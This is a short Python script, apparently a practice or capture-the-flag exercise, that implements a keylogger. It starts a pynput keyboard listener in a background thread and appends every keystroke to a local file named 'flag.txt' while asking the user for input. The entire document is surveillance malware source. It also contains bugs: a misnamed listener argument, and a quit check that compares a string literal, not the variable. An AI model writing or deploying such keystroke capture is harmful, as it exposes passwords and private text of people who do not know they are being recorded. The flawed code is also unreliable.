from pynput.keyboard import Key,Listener
import threading

all = []

def pressed(key):
    global all
    all.append(str(key))
    f = open('flag.txt','a')
    f.write(str(key))
    f.close()

def released(key):
    pass

def keylog():
    l = Listener(on_press=pressed,on_released=released)
    l.start()

t1 = threading.Thread(target=keylog)
t1.start()

text = input("Please enter text: ")

if 'text' == "quit":
    t1.join()
    print("Printing all the keys that have been logged")
    print(all)


